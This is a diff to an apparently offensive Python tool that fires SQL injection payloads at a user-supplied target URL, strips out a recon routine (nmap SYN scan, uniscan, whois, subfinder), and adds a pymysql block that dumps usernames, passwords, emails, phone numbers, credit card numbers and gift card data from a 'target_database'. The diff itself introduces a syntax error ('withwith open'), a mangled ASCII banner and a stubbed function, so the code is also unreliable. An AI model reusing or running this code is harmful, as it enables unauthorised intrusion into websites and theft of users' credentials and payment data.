@@ -3,6 +3,7 @@ import subprocess
 import requests
 from requests.exceptions import RequestException, SSLError
 from datetime import datetime
+import pymysql
 
 file_count = 1  # Initialize file_count globally
 
@@ -62,10 +63,9 @@ def print_header():
  |         'i::i  i         'i:';°      /                `;::\           /.'´      _         ';/' ‘         /.'´      _         ';/' ‘          /                `;::\         '`;        ,– .,        'i:'/   
  ';        ;'::/¯/;        ';:;‘'    ,'                   '`,::;       ,:     ,:'´::;'`·.,_.·'´.,    ‘    ,:     ,:'´::;'`·.,_.·'´.,    ‘     ,'                   '`,::;         i       i':/:::';       ;/'    
  'i        i':/_/:';        ;:';°   i'       ,';´'`;         '\:::', ‘  /     /':::::/;::::_::::::::;‘    /     /':::::/;::::_::::::::;‘     i'       ,';´'`;         '\:::', ‘     i       i/:·'´       ,:''      
-  ;       i·´   '`·;       ;:/°  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯     ¯'`;:';‘  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯     ¯'`·;:::¦‘  ,'        ;' /´:`';         ';:::'i‘     '; '    ,:,     ~;'´:::'`:,   
-  ';      ;·,  '  ,·;      ;/'    ;        ;/:;::;:';         ',:::;'i     ';::::::'\             ';:';‘ 'i     ';::::::'\             ';:';‘  ;        ;/:;::;:';         ',:::;     'i      i:/\       `;::::/:'`;'
+  ;       i·´   '`·;       ;:/°  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯     ¯'`·;:::¦‘  ,'       `;        ;/:;::;:';         ',:::;'i     ';::::::'\             ';:';‘ 'i     ';::::::'\             ';:';‘  ;        ;/:;::;:';         ',:::;     'i      i:/\       `;::::/:'`;'
    ';    ';/ '`'*'´  ';    ';/' '‘  'i        '´        `'         'i::'/ ;      '`·:;:::::`'*;:'´      |/'   ;      '`·:;:::::`'*;:'´      |/'  'i        '´        `'         'i::'/      ;     ;/   \       '`:/::::/'
-    \   /          '\   '/'      ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘   \          '`*^*'´         /'  ‘ ¦       '/`' *^~-·'´\         ';'/'‚      ';   ,'       \         '`;/' 
+    \   /          '\   '/'      ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘   \          '`*^*'´         /'  ‘ ¦       '/`' *^~-·'´\         ';'/'‚      ';   ,'       \         '`;/ 
      '`'´             `''´   '    '`., .·´              `·.,_,.·´  ‚    `·.,               ,.-·´          `·.,               ,.-·´      '`., .·´              `·.,_,.·´  ‚       `'*´          '`~·-·^'´    
                       '                                                    '`*^~·~^*'´                     '`*^~·~^*'´                                                                                
     \033[0m
@@ -125,7 +125,7 @@ def perform_sql_injection(target_url, results_dir):
             print(f"Saved SQL Injection results to {output_file}")
             file_count += 1         
         except SSLError as e:
-            output_file =output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
+            output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
             with open(output_file, 'w') as file:
                 file.write(f"Payload: {payload}\n")
                 file.write(f"SSL Error: {e}\n")
@@ -133,57 +133,17 @@ def perform_sql_injection(target_url, results_dir):
             file_count += 1
         except RequestException as e:
             output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
-            with open(output_file, 'w') as file:
+            withwith open(output_file, 'w') as file:
                 file.write(f"Payload: {payload}\n")
-                file.write(f"Request Error: {e}\n")
+                file.write(f"Request Exception: {e}\n")
             print(f"Saved SQL Injection error to {output_file}")
             file_count += 1
+    print(f"All results have been saved to {results_dir}")
 
 def perform_scan(target_url, results_dir):
-    """Perform a scan on the target URL."""
-    results_file = os.path.join(results_dir, "scan_results.txt")
-    
-    # Run uniscan
-    print("Running uniscan...")
-    stdout, stderr = run_command(["uniscan", "-u", target_url, "-qweds"])
-    save_to_file(results_file, "Uniscan output:")
-    save_to_file(results_file, stdout)
-    if stderr:
-        save_to_file(results_file, "Uniscan errors:")
-        save_to_file(results_file, stderr)
-    
-    # Run nmap scan
-    print("Running nmap scan...")
-    stdout, stderr = run_command(["nmap", "-sS", "-sV", "-T4", target_url])
-    save_to_file(results_file, "Nmap output:")
-    save_to_file(results_file, stdout)
-    if stderr:
-        save_to_file(results_file, "Nmap errors:")
-        save_to_file(results_file, stderr)
-    
-    # Run whois lookup
-    print("Running whois lookup...")
-    stdout, stderr = run_command(["whois", target_url])
-    save_to_file(results_file, "Whois output:")
-    save_to_file(results_file, stdout)
-    if stderr:
-        save_to_file(results_file, "Whois errors:")
-        save_to_file(results_file, stderr)
-    
-    # Run subfinder
-    print("Running subfinder...")
-    stdout, stderr = run_command(["subfinder", "-d", target_url])
-    save_to_file(results_file, "Subfinder output:")
-    save_to_file(results_file, stdout)
-    if stderr:
-        save_to_file(results_file, "Subfinder errors:")
-        save_to_file(results_file, stderr)
-    
-    # Append a message indicating the end of the scan
-    with open(results_file, 'a') as file:
-        file.write("\nScan completed by Haggar\n")
-    
-    print(f"All results have been saved to {results_file}")
+    # Perform a scan using tools like nmap, uniscan, and sqlmap
+    # This function is not implemented, please implement it according to your needs
+    pass
 
 def main():
     target_url = input("Enter the target URL: ")
@@ -193,6 +153,22 @@ def main():
     if check_website_status(target_url):
         perform_sql_injection(target_url, results_dir)
         perform_scan(target_url, results_dir)
+        
+        # Establish a connection to the database
+        conn = pymysql.connect(host='your_database_host', user='your_username', password='your_password', database='target_database')
+        cursor = conn.cursor()
+
+        # Execute SQL queries to retrieve desired data
+        cursor.execute("SELECT username, password, email, phone_number, cc_number, gift_card_info FROM users")
+        data = cursor.fetchall()
+
+        for row in data:
+            username, password, email, phone_number, cc_number, gift_card = row
+            print(f'Username: {username}, Password: {password}, Email: {email}, Phone Number: {phone_number}, CC Number: {cc_number}, Gift Card Info: {gift_card}')
+
+        # Close the connection to the database
+        cursor.close()
+        conn.close()
     else:
         print("The website is not accessible. Aborting scan.")
 
